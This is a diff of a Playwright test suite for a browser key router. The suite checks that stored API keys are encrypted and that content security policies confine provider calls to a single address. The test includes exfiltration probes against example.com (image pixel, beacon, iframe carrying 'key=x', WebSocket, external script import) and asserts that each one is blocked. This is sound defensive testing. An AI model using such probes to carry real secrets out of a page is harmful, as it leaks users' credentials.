@@ -3,7 +3,7 @@
 // Needs `npx wrangler dev --port 8787` running (PORT=<n> for another port), or LIVE=<workers.dev subdomain>.
 import { createRequire } from "node:module";
 const { chromium } = createRequire(import.meta.url)("playwright");
-import { launchWithPartitioning, keptGrant } from "./real-browser.mjs";
+import { launchWithPartitioning, keptGrant, callers, keptAccounts } from "./real-browser.mjs";
 const LIVE = process.env.LIVE;
 const base = (name) => LIVE ? (name === "hub" && process.env.LIVE_MAIN) || `https://${name === "hub" ? "portauthority" : "pa-" + name}.${LIVE}` : `http://${name}.localhost:${process.env.PORT || 8787}`;
 // Storage partitioning has to be on, as it is in a person's own browser. Playwright switches it off.
@@ -23,6 +23,10 @@ const KEY = "sk-test-THIS-KEY-MUST-NOT-LEAK-0123456789";
 // In the router window an account is a group, and its models are the choices inside it.
 const pickModel = (popup, account, model) => popup.locator("#choices .account", { hasText: account }).locator("label", { hasText: model }).click();
 const KEY2 = "sk-spare-THIS-ONE-MUST-NOT-LEAK-EITHER-9876543210";
+// A call to a provider is made by the router's call worker. The browser files a worker's request under the page
+// that started it, so a call is "by the router" when it comes from the router frame or the router's own page.
+const byRouter = (call) => !!call && [base("router") + "/frame.html", base("router") + "/", base("router") + "/pick.html#window"].includes(call.from);
+const callerUrls = async (page) => (await callers(page)).map((c) => c.url()).join();
 
 // A stand-in for Anthropic: answers the streaming Messages API and records the key it was sent.
 const seen = [];
@@ -102,6 +106,24 @@ check("an account is saved at the router", /Work key/.test(await home.locator("#
 await home.click("#accounts [data-test]");
 await home.locator("#accounts", { hasText: "It answered" }).waitFor();   // not waitForFunction: the router pages forbid eval
 check("the router's home page can test the key", /Dear Ada/.test(await home.locator("#accounts").innerText()));
+// How the key is kept at the router's own address: encrypted, beside a key the browser will use and will not export.
+let atRest = await keptAccounts(home);
+check("the key is not kept as text anywhere at the router's address: only its last four characters are", !atRest.plain.includes(KEY) && atRest.listed.length === 1 && atRest.listed[0].ends === KEY.slice(-4) && !("key" in atRest.listed[0]) && /key ends 6789/.test(await home.locator("#accounts").innerText()), atRest.plain.slice(0, 160));
+check("it is kept encrypted, beside a key that the browser will not export", atRest.secrets.length === 1 && !atRest.secrets[0].text.includes(KEY) && !!atRest.secrets[0].sealed.data && atRest.secrets[0].exported === "refused" && atRest.secrets[0].key === "secret AES-GCM extractable=false usages=decrypt,encrypt,unwrapKey,wrapKey", atRest.secrets[0] && atRest.secrets[0].key + ", export " + atRest.secrets[0].exported);
+check("and the test of the key was made with that: the call carried the real key", seen.at(-1).key === KEY);
+// An account from before, when keys were kept as text, is encrypted the next time the router's page is opened.
+await home.evaluate((old) => localStorage.setItem("router.accounts", JSON.stringify([...JSON.parse(localStorage.getItem("router.accounts")), old])), { id: "from-before", provider: "anthropic", label: "From before", key: "sk-old-KEPT-AS-TEXT-0000111122223333", models: ["claude-sonnet-5-5"] });
+await home.reload();
+await home.locator("#accounts li", { hasText: "From before" }).waitFor();
+await home.locator("#accounts li", { hasText: "From before" }).locator("[data-test]").click();
+// The stand-in for the provider knows one key and refuses any other. Being refused shows the old key reached it whole.
+await home.locator("#accounts li", { hasText: "From before" }).filter({ hasText: "answered 401" }).waitFor();
+atRest = await keptAccounts(home);
+check("an account that was kept as text is encrypted when the router's page is next opened, and its key still reaches the provider whole", !atRest.plain.includes("sk-old-KEPT-AS-TEXT") && atRest.secrets.length === 2 && atRest.secrets.every((kept) => kept.exported === "refused") && seen.at(-1).key === "sk-old-KEPT-AS-TEXT-0000111122223333" && /key ends 3333/.test(await home.locator("#accounts").innerText()), atRest.plain.slice(0, 200));
+home.once("dialog", (dialog) => dialog.accept());
+await home.locator("#accounts li", { hasText: "From before" }).locator("[data-remove]").click();
+await home.locator("#accounts li", { hasText: "From before" }).waitFor({ state: "detached" });
+check("removing an account removes its key too", (await keptAccounts(home)).secrets.length === 1);
 
 // And a second account, with another provider.
 await home.click("#add summary");
@@ -113,7 +135,7 @@ await home.locator("#accounts li[data-id]").nth(1).waitFor();
 await home.locator("#accounts li", { hasText: "Spare key" }).locator("[data-test]").click();
 await home.locator("#accounts li", { hasText: "Spare key" }).locator("text=It answered").waitFor();
 check("the home page can test the second account, and the call goes to its provider from the page for that provider", /A note from the stand-in/.test(await home.locator("#accounts li", { hasText: "Spare key" }).innerText())
-  && seenOpenAI.at(-1).from === base("router") + "/call/openai" && seenOpenAI.at(-1).path === "/v1/chat/completions" && seenOpenAI.at(-1).body.model === "gpt-6.2-sol" && seenOpenAI.at(-1).body.stream === true, seenOpenAI.at(-1) && seenOpenAI.at(-1).from);
+  && byRouter(seenOpenAI.at(-1)) && seenOpenAI.at(-1).path === "/v1/chat/completions" && seenOpenAI.at(-1).body.model === "gpt-6.2-sol" && seenOpenAI.at(-1).body.stream === true, seenOpenAI.at(-1) && seenOpenAI.at(-1).from);
 
 // The window that was open shows the accounts as soon as they are saved. Don't allow: nothing changes.
 await popup.locator("#choices", { hasText: "Spare key" }).waitFor();
@@ -145,7 +167,7 @@ await florist.click("#write");
 await florist.waitForFunction(() => /pieces/.test(document.querySelector("#log").textContent));
 check("the answer streams into the site", (await florist.locator("#card").innerText()) === "Dear Ada, well done on passing.");
 check("the provider was called with the person's key", seen.at(-1).key === KEY && seen.at(-1).body.model === "claude-sonnet-5-5" && seen.at(-1).body.stream === true);
-check("the call was made by the router's page for that one provider, not by the site", seen.at(-1).from === base("router") + "/call/anthropic", seen.at(-1).from);
+check("the call was made by the router's worker for that one provider, not by the site", byRouter(seen.at(-1)) && (await callerUrls(florist)) === base("router") + "/call/anthropic.js", seen.at(-1).from + " " + (await callerUrls(florist)));
 check("the site saw how many requests are left", /4 requests left/.test(await florist.locator("#state").innerText()));
 
 // The site cannot get at the key: not in any message, not in its storage, not by reaching into the frame.
@@ -188,7 +210,8 @@ const csp = await header("/frame.html");
 check("the router frame is served with a content security policy", /default-src 'none'/.test(csp) && !/unsafe/.test(csp), csp.slice(0, 60));
 check("the router frame may connect to nothing", connect(csp) === "'none'", connect(csp));
 check("nor may the router's own page, the router window, or the worker", connect(await header("/")) === "'none'" && connect(await header("/pick.html")) === "'none'" && connect(await header("/frame-worker.js")) === "'none'");
-check("the page that calls Anthropic may connect to Anthropic's one chat address and nothing else", connect(await header("/call/anthropic")) === "https://api.anthropic.com/v1/messages", connect(await header("/call/anthropic")));
+check("the worker that calls Anthropic is sent with a policy that allows Anthropic's one chat address and nothing else", (await header("/call/anthropic.js")) === "default-src 'none'; script-src 'self'; connect-src https://api.anthropic.com/v1/messages" && (await header("/call/openai.js")) === "default-src 'none'; script-src 'self'; connect-src https://api.openai.com/v1/chat/completions", await header("/call/anthropic.js"));
+check("the page that calls Anthropic, for a browser with no such worker, may connect to Anthropic's one chat address and nothing else", connect(await header("/call/anthropic")) === "https://api.anthropic.com/v1/messages", connect(await header("/call/anthropic")));
 check("the page that calls OpenAI may connect to OpenAI's one chat address and nothing else", connect(await header("/call/openai")) === "https://api.openai.com/v1/chat/completions");
 check("a call page for an unknown provider, or at the old address, may connect to nothing", connect(await header("/call/example.com")) === "'none'" && connect(await header("/call.html")) === "'none'" && connect(await header("/call.html?provider=anthropic")) === "'none'");
 const tryFetch = (where, address) => where.evaluate((a) => fetch(a, { mode: "no-cors" }).then(() => "allowed", () => "blocked"), address);
@@ -198,44 +221,31 @@ check("the router frame cannot connect to the router's own server either", (awai
 const frameWorker = florist.workers().find((w) => w.url().endsWith("/frame-worker.js"));
 check("the worker inside the frame cannot connect to anything", !!frameWorker && (await tryFetch(frameWorker, "/_sites.js")) === "blocked" && (await tryFetch(frameWorker, "https://example.com/")) === "blocked" && (await tryFetch(frameWorker, "https://api.anthropic.com/v1/messages")) === "blocked" && seen.length === before);
 check("the router frame cannot connect to the provider itself", (await tryFetch(frame, "https://api.anthropic.com/v1/messages")) === "blocked" && seen.length === before);
-const callPage = florist.frames().find((f) => f.url().includes("/call/"));
-check("the page that calls the provider is inside the router frame", !!callPage && callPage.parentFrame() === frame && callPage.url() === base("router") + "/call/anthropic", callPage && callPage.url());
-check("the page that calls the provider cannot connect to any other address at that provider", (await tryFetch(callPage, "https://api.anthropic.com/v1/models")) === "blocked" && (await tryFetch(callPage, "https://api.anthropic.com/v1/messages/batches")) === "blocked"
-  && (await tryFetch(callPage, "https://api.anthropic.com/")) === "blocked" && seen.length === before);
-check("the page that calls the provider cannot connect to another provider", (await tryFetch(callPage, "https://api.openai.com/v1/models")) === "blocked");
-check("the page that calls the provider cannot connect to another address", (await tryFetch(callPage, "https://example.com/")) === "blocked");
-// Things a page could be talked into doing to carry a key out. Each is stopped by its policy.
-const tried = await callPage.evaluate(async () => {
-  // The browser reports each thing its policy stops. One attempt at a time, with a pause
-  // after it, so that a report is counted against the attempt that caused it.
-  const refused = async (work) => {
-    const result = await new Promise((resolve) => {
-      const heard = (event) => { document.removeEventListener("securitypolicyviolation", heard); resolve(event.effectiveDirective); };
-      document.addEventListener("securitypolicyviolation", heard);
-      setTimeout(() => { document.removeEventListener("securitypolicyviolation", heard); resolve("allowed"); }, 1500);
-      try { work(); } catch { /* the report says why */ }
-    });
-    await new Promise((resolve) => setTimeout(resolve, 150));
-    return result;
-  };
-  return {
-    // Asked for from a timer: code run straight from the test's own tools is let through, as it is from DevTools.
-    eval: await refused(() => { setTimeout(() => { try { new Function("return 1")(); window.__evaled = true; } catch { /* the report says why */ } }, 0); }),
-    evaled: window.__evaled === true,
-    inline: await refused(() => { const script = document.createElement("script"); script.textContent = "window.__ran = true"; document.head.append(script); }),
-    ran: window.__ran === true,
-    image: await refused(() => { new Image().src = "https://example.com/pixel.png?key=x"; }),
-    style: await refused(() => { const link = document.createElement("link"); link.rel = "stylesheet"; link.href = "https://fonts.googleapis.com/css2?family=x"; document.head.append(link); }),
-    frame: await refused(() => { const frame = document.createElement("iframe"); frame.src = "https://example.com/?key=x"; document.documentElement.append(frame); }),
-    script: await refused(() => { const script = document.createElement("script"); script.src = "https://example.com/x.js"; document.head.append(script); }),
-    beacon: await refused(() => { navigator.sendBeacon("https://example.com/?key=x", "x"); }),
-    socket: await refused(() => { new WebSocket("wss://example.com/"); }),
-  };
+const callWorker = florist.workers().find((w) => w.url() === base("router") + "/call/anthropic.js");
+check("the calls are made by a worker for that one provider, and no page is opened to make them", !!callWorker && !florist.frames().some((f) => f.url().includes("/call/")), (await callerUrls(florist)));
+check("the call worker cannot connect to any other address at that provider", (await tryFetch(callWorker, "https://api.anthropic.com/v1/models")) === "blocked" && (await tryFetch(callWorker, "https://api.anthropic.com/v1/messages/batches")) === "blocked"
+  && (await tryFetch(callWorker, "https://api.anthropic.com/")) === "blocked" && seen.length === before);
+check("the call worker cannot connect to another provider", (await tryFetch(callWorker, "https://api.openai.com/v1/models")) === "blocked");
+check("the call worker cannot connect to another address", (await tryFetch(callWorker, "https://example.com/")) === "blocked");
+// Things a script could be talked into doing to carry a key out. A worker has no document, so most are not there to try.
+const tried = await callWorker.evaluate(async () => {
+  const stopped = [];
+  addEventListener("securitypolicyviolation", (event) => stopped.push(event.effectiveDirective + " " + event.blockedURI + " | " + event.originalPolicy));
+  const out = {};
+  // Asked for from a timer: code run straight from the test's own tools is let through, as it is from DevTools.
+  out.evaled = await new Promise((resolve) => setTimeout(() => { try { new Function("return 1")(); resolve(true); } catch { resolve(false); } }, 0));
+  out.imported = await import("https://example.com/x.js").then(() => true, () => false);
+  try { new WebSocket("wss://example.com/"); } catch { /* the report says why */ }
+  out.has = { document: typeof document, Image: typeof Image, open: typeof self.open, sendBeacon: typeof navigator.sendBeacon, assign: typeof location.assign, frames: typeof self.frames, parent: typeof self.parent };
+  await new Promise((resolve) => setTimeout(resolve, 400));
+  out.stopped = stopped;
+  return out;
 });
-check("the call page cannot be made to run other code: no eval, no script written in, no script from elsewhere", /^script-src/.test(tried.eval) && !tried.evaled && /^script-src/.test(tried.inline) && !tried.ran && /^script-src/.test(tried.script), JSON.stringify(tried));
-check("the call page cannot carry a key out in an image, a style sheet, a frame, a beacon or a socket", /^img-src/.test(tried.image) && /^style-src/.test(tried.style) && /^(frame-src|child-src)/.test(tried.frame) && /^connect-src/.test(tried.beacon) && /^connect-src/.test(tried.socket), JSON.stringify(tried));
+check("the call worker cannot be made to run other code: no eval, and no script from elsewhere", tried.evaled === false && tried.imported === false && tried.stopped.some((line) => /^script-src/.test(line)), JSON.stringify(tried).slice(0, 300));
+check("it has no page to carry a key out with: no document, no image, no window to open, no address to go to, no beacon", Object.values(tried.has).every((kind) => kind === "undefined") && tried.stopped.some((line) => /^connect-src wss:\/\/example\.com/.test(line)), JSON.stringify(tried.has));
+check("and it is held to the policy on its own script, which names one address, not to the frame's", tried.stopped.length > 0 && tried.stopped.every((line) => line.endsWith("| default-src 'none'; script-src 'self'; connect-src https://api.anthropic.com/v1/messages")), tried.stopped[0]);
 check("the router frame around it has no styles, fonts or images to load from anywhere, and cannot hold a frame from another site", !/style-src|font-src|img-src|https?:/.test(csp) && /frame-src 'self'/.test(csp), csp);
-check("the page that calls the provider cannot connect to the router's server", (await tryFetch(callPage, "/_sites.js")) === "blocked");
+check("the call worker cannot connect to the router's server", (await tryFetch(callWorker, "/_sites.js")) === "blocked");
 check("the site's requests go through a worker inside the frame", florist.workers().some((w) => w.url().endsWith("/frame-worker.js")));
 
 // The site lends a port to an iframe from a third site, limited to 2 requests.
@@ -271,7 +281,7 @@ check("the chunks name the model the person chose, and the last one carries the 
 const sent = seen.at(-1);
 check("the request reached the provider with the site's settings", sent.body.model === "claude-sonnet-5-5" && sent.body.system === "You write cards." && sent.body.temperature === 0.2 && sent.body.max_tokens === 99
   && JSON.stringify(sent.body.stop_sequences) === '["END"]' && JSON.stringify(sent.body.messages) === JSON.stringify([{ role: "user", content: "A card for Ada" }]), JSON.stringify(sent.body));
-check("that call was also made by the page for the one provider, with the key the site never sees", sent.from === base("router") + "/call/anthropic" && sent.key === KEY && !JSON.stringify(routed).includes(KEY));
+check("that call was also made by the router's worker for the one provider, with the key the site never sees", byRouter(sent) && sent.key === KEY && !JSON.stringify(routed).includes(KEY));
 
 // Another site has no grant, even though the same frame is used.
 const library = await ctx.newPage();
@@ -293,9 +303,9 @@ const notes = await library.locator("#notes p").allInnerTexts();
 check("a worker holding a port wrote a note for all four books", notes.length === 4 && notes.every((n) => /A note from the stand-in\./.test(n)), notes[0]);
 const libraryCalls = seenOpenAI.slice(openaiCalls);
 check("the second site's prompts went to its provider and not to the first site's", libraryCalls.length === 4 && seen.length === anthropicCalls
-  && libraryCalls.every((c) => c.from === base("router") + "/call/openai" && c.key === "Bearer " + KEY2 && c.body.model === "gpt-6.2-sol"), libraryCalls[0] && libraryCalls[0].from);
-const libraryFrame = library.frames().find((f) => f.url().includes("/call/"));
-check("the second site's call page cannot connect to the first site's provider", (await tryFetch(libraryFrame, "https://api.anthropic.com/v1/messages")) === "blocked" && seen.length === anthropicCalls);
+  && libraryCalls.every((c) => byRouter(c) && c.key === "Bearer " + KEY2 && c.body.model === "gpt-6.2-sol"), libraryCalls[0] && libraryCalls[0].from);
+const libraryCaller = library.workers().find((w) => w.url() === base("router") + "/call/openai.js");
+check("the second site's call worker is for its own provider, and cannot connect to the first site's", !!libraryCaller && (await callerUrls(library)) === base("router") + "/call/openai.js" && (await tryFetch(libraryCaller, "https://api.anthropic.com/v1/messages")) === "blocked" && seen.length === anthropicCalls, (await callerUrls(library)));
 
 // A port lent for 3 requests stops at 3.
 await library.click("#lend");
@@ -344,7 +354,7 @@ check("given a tool, the model's call for it comes back to the site, with finish
   && JSON.stringify(plain.asked.message.tool_calls) === JSON.stringify([{ id: "call_stand_in", type: "function", function: { name: "get_weather", arguments: '{"town":"Hull"}' } }]), JSON.stringify(plain.asked));
 check("the site runs the tool and sends the result, and the model answers with it", plain.told.message.content === "The tool said: raining in Hull" && plain.told.finish_reason === "stop" && plain.told.message.tool_calls === undefined, JSON.stringify(plain.told));
 const withTools = seenOpenAI.filter((c) => c.body.tools);
-check("the provider was sent the tools, the image, the call and its result, from the page for that provider", withTools.length === 3 && withTools.every((c) => c.from === base("router") + "/call/openai")
+check("the provider was sent the tools, the image, the call and its result, from the page for that provider", withTools.length === 3 && withTools.every((c) => byRouter(c))
   && JSON.stringify(withTools[0].body.tools) === JSON.stringify([{ type: "function", function: { name: "get_weather", description: "The weather in a town.", parameters: { type: "object", properties: { town: { type: "string" } }, required: ["town"] } } }])
   && withTools[0].body.tool_choice === "auto" && JSON.stringify(withTools[0].body.messages[0].content[1]) === JSON.stringify({ type: "image_url", image_url: { url: plain.PNG } })
   && JSON.stringify(withTools[1].body.messages.slice(1)) === JSON.stringify([{ role: "assistant", content: null, tool_calls: [{ id: "call_stand_in", type: "function", function: { name: "get_weather", arguments: '{"town":"Hull"}' } }] }, { role: "tool", tool_call_id: "call_stand_in", content: "raining in Hull" }]),
